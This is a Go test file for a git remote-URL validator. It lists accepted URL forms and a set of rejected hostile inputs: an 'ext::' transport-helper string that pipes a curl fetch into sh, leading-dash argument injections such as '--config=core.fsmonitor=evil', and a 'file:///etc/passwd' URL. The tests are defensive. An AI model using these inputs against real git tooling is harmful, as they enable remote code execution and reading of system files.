package git

import "testing"

func TestValidateRemoteURL_Accepts(t *testing.T) {
	ok := []string{
		"https://github.com/you/your-project-bacio-sync.git",
		"http://internal.example.com/sync.git",
		"ssh://git@github.com/you/sync.git",
		"git://example.com/sync.git",
		"git@github.com:you/your-project-bacio-sync.git",
		"github.com:you/sync.git",
		"/srv/sync/your-project",
		"  https://github.com/you/sync.git  ", // surrounding whitespace is trimmed
	}
	for _, in := range ok {
		if err := ValidateRemoteURL(in); err != nil {
			t.Errorf("ValidateRemoteURL(%q) = %v, want nil", in, err)
		}
	}
}

func TestValidateRemoteURL_Rejects(t *testing.T) {
	bad := []string{
		"",                                  // empty
		"ext::sh -c 'curl http://x|sh' %S /", // transport-helper RCE
		"transport::https://example.com/x",   // transport-helper prefix
		"fd::17",                             // transport-helper prefix
		"-upload-pack=evil",                  // argument injection (leading dash)
		"--config=core.fsmonitor=evil",       // argument injection (leading dash)
		"file:///etc/passwd",                 // disallowed scheme
		"relative/path/to/repo",              // not a recognised remote form
		"https://example.com/\x00evil",       // control character
	}
	for _, in := range bad {
		if err := ValidateRemoteURL(in); err == nil {
			t.Errorf("ValidateRemoteURL(%q) = nil, want error", in)
		}
	}
}

func TestValidateRemoteURL_TooLong(t *testing.T) {
	long := "https://example.com/"
	for len(long) <= maxRemoteURLLen {
		long += "a"
	}
	if err := ValidateRemoteURL(long); err == nil {
		t.Errorf("ValidateRemoteURL(<%d bytes>) = nil, want length error", len(long))
	}
}
